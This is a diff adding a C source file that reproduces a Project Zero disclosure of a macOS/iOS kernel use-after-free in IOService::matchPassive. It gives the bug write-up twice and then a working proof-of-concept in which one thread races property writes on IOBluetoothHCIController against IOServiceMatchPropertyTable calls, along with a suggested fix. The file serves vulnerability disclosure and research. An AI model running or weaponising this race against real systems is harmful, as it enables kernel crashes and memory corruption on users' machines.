@@ -1,0 +1,161 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=973
+
+IOService::matchPassive is called when trying to match a request dictionary against a candidate IOService.
+We can call this function on a controlled IOService with a controlled matching table OSDictionary via the
+io_service_match_property_table_* kernel MIG APIs wrapped by IOServiceMatchPropertyTable.
+
+If a candidate IOService does match against the dictionary but the dictionary also specifies an
+"IOParentMatch" key then we reach the following code (in IOService.cpp:)
+
+  OSNumber* alternateRegistryID = OSDynamicCast(OSNumber, where->getProperty(kIOServiceLegacyMatchingRegistryIDKey));
+  if(alternateRegistryID != NULL) {
+    if(aliasServiceRegIds == NULL)
+    {
+      aliasServiceRegIds = OSArray::withCapacity(sizeof(alternateRegistryID));
+    }
+    aliasServiceRegIds->setObject(alternateRegistryID);
+  }
+
+("where" is the controlled IOService.)
+getProperty is an IORegistryEntry API which directly calls the getObject method
+of the OSDictionary holding the entry's properties. getProperty, unlike copyProperty, doesn't take a reference on
+the value of the property which means that there is a short window between
+
+  where->getProperty(kIOServiceLegacyMatchingRegistryIDKey)
+and
+  aliasServiceRegIds->setObject(alternateRegistryID)
+
+when if another thread sets a new value for the IOService's "IOServiceLegacyMatchingRegistryID" registry property
+the alternateRegistryID OSNumber can be freed. This race condition can be won quite easily and can lead to a virtual call
+being performed on a free'd object.
+
+On MacOS IOBluetoothHCIController is one of a number of IOServices which allow an unprivileged user to set the
+IOServiceLegacyMatchingRegistryID property.
+
+One approach to fixing this bug would be to call copyProperty instead and drop the ref on the property after adding it
+to the aliasServiceRegIds array.
+
+Tested on MacOS Sierra 10.12.1 (16B2555)
+*/
+
+// ianbeer
+// clang -o iorace iorace.c -framework IOKit -framework CoreFoundation && sync
+
+#if 0
+MacOS/iOS kernel use after free due to failure to take reference in IOService::matchPassive
+
+IOService::matchPassive is called when trying to match a request dictionary against a candidate IOService.
+We can call this function on a controlled IOService with a controlled matching table OSDictionary via the
+io_service_match_property_table_* kernel MIG APIs wrapped by IOServiceMatchPropertyTable.
+
+If a candidate IOService does match against the dictionary but the dictionary also specifies an
+"IOParentMatch" key then we reach the following code (in IOService.cpp:)
+
+  OSNumber* alternateRegistryID = OSDynamicCast(OSNumber, where->getProperty(kIOServiceLegacyMatchingRegistryIDKey));
+  if(alternateRegistryID != NULL) {
+    if(aliasServiceRegIds == NULL)
+    {
+      aliasServiceRegIds = OSArray::withCapacity(sizeof(alternateRegistryID));
+    }
+    aliasServiceRegIds->setObject(alternateRegistryID);
+  }
+
+("where" is the controlled IOService.)
+getProperty is an IORegistryEntry API which directly calls the getObject method
+of the OSDictionary holding the entry's properties. getProperty, unlike copyProperty, doesn't take a reference on
+the value of the property which means that there is a short window between
+
+  where->getProperty(kIOServiceLegacyMatchingRegistryIDKey)
+and
+  aliasServiceRegIds->setObject(alternateRegistryID)
+
+when if another thread sets a new value for the IOService's "IOServiceLegacyMatchingRegistryID" registry property
+the alternateRegistryID OSNumber can be freed. This race condition can be won quite easily and can lead to a virtual call
+being performed on a free'd object.
+
+On MacOS IOBluetoothHCIController is one of a number of IOServices which allow an unprivileged user to set the
+IOServiceLegacyMatchingRegistryID property.
+
+One approach to fixing this bug would be to call copyProperty instead and drop the ref on the property after adding it
+to the aliasServiceRegIds array.
+
+Tested on MacOS Sierra 10.12.1 (16B2555)
+#endif
+
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <stdint.h>
+
+#include <pthread.h>
+
+#include <mach/mach.h>
+#include <mach/mach_vm.h>
+
+#include <IOKit/IOKitLib.h>
+#include <CoreFoundation/CoreFoundation.h>
+
+io_service_t service = MACH_PORT_NULL;
+
+void* setter(void* arg) {
+  char number = 1;
+  CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberCharType, &number);
+
+  while(1) {
+    kern_return_t err;
+    err = IORegistryEntrySetCFProperty(
+      service,
+      CFSTR("IOServiceLegacyMatchingRegistryID"),
+      num);
+    
+    if (err != KERN_SUCCESS){
+      printf("setProperty failed\n");
+      return NULL;
+    }
+  }
+  return NULL;
+}
+
+int main(){
+  kern_return_t err;
+
+  service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOBluetoothHCIController"));
+
+  if (service == IO_OBJECT_NULL){
+    printf("unable to find service\n");
+    return 0;
+  }
+  printf("got service: %x\n", service);
+
+  pthread_t thread;
+  pthread_create(&thread, NULL, setter, NULL);
+
+  CFMutableDictionaryRef  dict2; 
+  dict2 = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
+                                   &kCFTypeDictionaryKeyCallBacks,
+                                   &kCFTypeDictionaryValueCallBacks);
+  CFDictionarySetValue(dict2, CFSTR("key"), CFSTR("value"));
+
+  CFMutableDictionaryRef  dict; 
+  dict = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
+                                   &kCFTypeDictionaryKeyCallBacks,
+                                   &kCFTypeDictionaryValueCallBacks);
+  CFDictionarySetValue(dict, CFSTR("IOProviderClass"), CFSTR("IOService"));
+  CFDictionarySetValue(dict, CFSTR("IOResourceMatch"), CFSTR("IOBSD"));
+  CFDictionarySetValue(dict, CFSTR("IOParentMatch"), dict2);
+
+  while(1) {
+    boolean_t match = 0;
+    err = IOServiceMatchPropertyTable(service, dict, &match);
+    if (err != KERN_SUCCESS){
+      printf("no matches\n");
+    }
+  }
+
+  pthread_join(thread, NULL);
+
+  return 0;
+}
